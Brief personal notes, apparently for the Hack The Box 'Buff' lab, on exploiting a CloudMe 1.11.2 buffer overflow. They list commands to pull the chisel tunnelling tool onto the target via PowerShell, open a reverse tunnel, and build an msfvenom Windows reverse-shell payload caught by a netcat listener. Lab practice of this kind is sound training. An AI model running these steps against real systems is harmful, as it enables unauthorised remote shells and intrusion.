Need to exploit CloudMe in downloads folder as shaun with chisel
searchsploit can use this buffer overlow:
	CloudMe 1.11.2 - Buffer Overflow (PoC | windows/remote/48389.py

https://github.com/jpillora/chisel

Download chisel for buff (windows) and yourself

https://github.com/jpillora/chisel/releases/
	buff: chisel_1.7.3_windows_amd64.gz
	linux:  chisel_1.7.3_linux_amd64.gz

Transfer chisel over to buff box:
	python3 -m htttp.server
	powershell -command "Invoke-WebRequest <ip>:8000/chisel_1.7.3_windows_amd64 -OutFile chisel.exe"

run chisel:
	buff: .\chisel.exe client 10.10.14.95:8081 R:8888:localhost:8888
	linux: /chisel_1.7.3_linux_amd64 server --port 8081 --reverse


Generate payload for the buffer overflow:
	msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -b '\x00\x0A\x0D' -f python -v payload
mirror the buffer overflow and replace the payload with the payload above ^

set up netcat listener and run the buffer overflow
and you should get a root shell
